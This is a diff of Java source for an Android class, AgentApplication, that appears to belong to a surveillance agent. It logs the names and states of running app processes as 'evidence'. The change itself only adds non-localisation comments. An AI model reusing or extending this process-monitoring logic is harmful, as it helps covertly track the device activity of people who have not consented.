@@ -28,7 +28,7 @@ import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
 public class AgentApplication extends AgentBase implements IncrementalLog, Observer<ProcessInfo> {
-	private static final String TAG = "AgentApplication";
+	private static final String TAG = "AgentApplication"; //$NON-NLS-1$
 
 	@Override
 	public boolean parse(AgentConf conf) {
@@ -61,7 +61,7 @@ public class AgentApplication extends AgentBase implements IncrementalLog, Obser
 
 	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
 		if (Cfg.DEBUG) {
-			Check.requires(process != null, "null process");
+			Check.requires(process != null, "null process"); //$NON-NLS-1$
 		}
 
 		final String name = process.processName;
@@ -77,12 +77,12 @@ public class AgentApplication extends AgentBase implements IncrementalLog, Obser
 		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
 		if (Cfg.DEBUG) {
-			Check.asserts(logIncremental != null, "null log");
+			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
 		}
 		logIncremental.write(items);
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveEvidence): " + name + " " + status.name());
+			Check.log(TAG + " (saveEvidence): " + name + " " + status.name()) ;//$NON-NLS-1$ //$NON-NLS-2$
 		}
 	}
 
